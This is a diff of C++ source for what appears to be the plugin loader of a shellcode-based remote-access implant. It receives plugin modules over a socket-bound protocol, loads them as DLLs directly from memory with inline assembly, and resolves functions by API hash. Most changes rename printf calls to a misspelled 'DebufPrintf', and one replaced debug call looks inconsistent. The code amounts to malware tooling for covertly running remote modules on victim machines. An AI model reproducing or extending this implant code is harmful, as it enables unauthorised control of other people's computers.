@@ -9,7 +9,7 @@ bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTE
                                    const void *data, LPCWSTR dllname, PMEMORYMODULE result);
 void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);
 
-int __cdecl printf (const char*, ...);
+int __cdecl printf(const char*, ...);
 
 class pluginEvent{
         PluginManager* PluginMgr;
@@ -22,6 +22,7 @@ PluginManagerInterfacePrivate* PluginManager::pluginList;
 class PluginManagerInterfacePrivate :public pluginManagerInterface{
         PluginManager* mgr;
         plugin* p;
+        friend class PluginManager;
     public:
         PluginManagerInterfacePrivate(PluginManager& mgr, plugin& p);
         plugin* getPlugInformation();
@@ -35,8 +36,9 @@ PluginManager::PluginManager(){
 
 PluginManager::~PluginManager(){
     if(pluginList){
-        printf("unloading plugin\n");
+        DebufPrintf("unloading plugin\n");
         //__asm__("int3");
+        delete pluginList->p->plugInterface;
         ::FreeLibraryFromMemory(Context->FreeLibraryFromMemory,
                                 Context,&pluginList->getPlugInformation()->Module);
     }
@@ -45,7 +47,7 @@ PluginManager::~PluginManager(){
 uint PluginManager::run(SHELLCODE_CONTEXT* Context){
     RPEP client(Context->hSocket,Context->hKey,this);
     protocol = &client;
-    //printf("despues de client\n");
+    //DebufPrintf("despues de client\n");
 
     this->Context = Context;
 
@@ -73,7 +75,7 @@ int exception(){
 bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTEXT* pSCC,
                                    const void *data, LPCWSTR dllname, PMEMORYMODULE result){
     int status = 0;
-    //printf("LoadLibraryFromMemory\n");
+    //DebufPrintf("LoadLibraryFromMemory\n");
 
     __asm__ __volatile__(
         "push %ebx;push %edx;push %ecx;push %esi;push %edi;"
@@ -98,7 +100,7 @@ bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTE
 }
 
 void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module){
-    //printf("LoadLibraryFromMemory\n");
+    //DebufPrintf("LoadLibraryFromMemory\n");
 
     __asm__ __volatile__(
         "push %eax;push %ebx;push %edx;push %ecx;push %esi;push %edi;"
@@ -125,40 +127,37 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
     bool result = false;
 
     if(!isPluginLoad(pluginModule->PluginID)){
-        printf("Cargando plugin....\n");
+        DebufPrintf("Cargando plugin....\n");
         newPlugin = new plugin();
-        printf("newPlugin addr %x\n",(uint)newPlugin);
+        DebufPrintf("newPlugin addr %x\n",(uint)newPlugin);
         //Cargamos el plugin
         {
-            /** /__asm__(
-                "int3"
-            );//*/
             loadResult = ::LoadLibraryFromMemory(Context->LoadLibraryFromMemory,Context,pluginModule->PluginModule,L"",&newPlugin->Module);
         }
         if(loadResult){
-            printf("modulo cargado con exito\n");
+            DebufPrintf("modulo cargado con exito\n");
             //Buscamos las funciones exportadas
             getInterface = (pgetInterface)GPA_WRAPPER(newPlugin->Module.ModuleBase,"getInterface");
             if(getInterface && (newPlugin->plugInterface = getInterface())){
-                //printf("getInterface\n");
+                //DebufPrintf("getInterface\n");
                 newPlugin->ID = pluginModule->PluginID;
-                //printf("pluginPrivate\n");
+                //DebufPrintf("pluginPrivate\n");
                 pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                 pluginList = pluginPrivate;
                 result = true;
             }else{
                 if(!getInterface){
                     uint error = (uint)GetLastError();
-                    printf("GetProcAddress error: %x(%s)\n",error,
+                    DebufPrintf("GetProcAddress error: %x(%s)\n",error,
                            error==ERROR_PROC_NOT_FOUND?"PROC_NOT_FOUND":"");
                     FreeLibraryFromMemory(Context->FreeLibraryFromMemory,Context,&newPlugin->Module);
                 }
                 delete newPlugin;
             }
         }
-    }else printf("ya cargado");
+    }else DebufPrintf("ya cargado");
 
-    printf("Cargado plugin: %s\n",result?"true":"false");
+    DebufPrintf("Cargado plugin: %s\n",result?"true":"false");
     return result;
 }
 
@@ -189,7 +188,7 @@ plugin* PluginManagerInterfacePrivate::getPlugInformation(){
 }
 
 int PluginManagerInterfacePrivate::sendData(const char *data, uint size){
-    printf("[sendData] enviando datos 0x%p addr\n",data);
+    DebufPrintf("[sendData] enviando datos 0x%p addr\n",data);
     if(data){
         DArray buff;
 
@@ -209,7 +208,7 @@ bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
          /*char buff[size+1];
          ZeroMemory(buff,size+1);
          memcpy(buff,data,size);
-         printf("onReciveData size %x cadena %s\n",(uint)size,(char*)buff);*/
+         DebufPrintf("onReciveData size %x cadena %s\n",(uint)size,(char*)buff);*/
 
          currentPlugin->plugInterface->onReciveData(data,size);
     }
@@ -245,7 +244,7 @@ FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ulong hash){
             ExpDir = (PIMAGE_EXPORT_DIRECTORY)(PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                     .VirtualAddress+(ulong)hModule);
 #ifdef DEBUG
-            DebugPrintf("GPA","ExpDir = %p,EXPORT_DIRECTORY = %x",ExpDir,PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+            DebufPrintf("GPA","ExpDir = %p,EXPORT_DIRECTORY = %x",ExpDir,PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                         .VirtualAddress);
 #endif
             //Localizo los nombres de simbolos exportados y busco la funcion
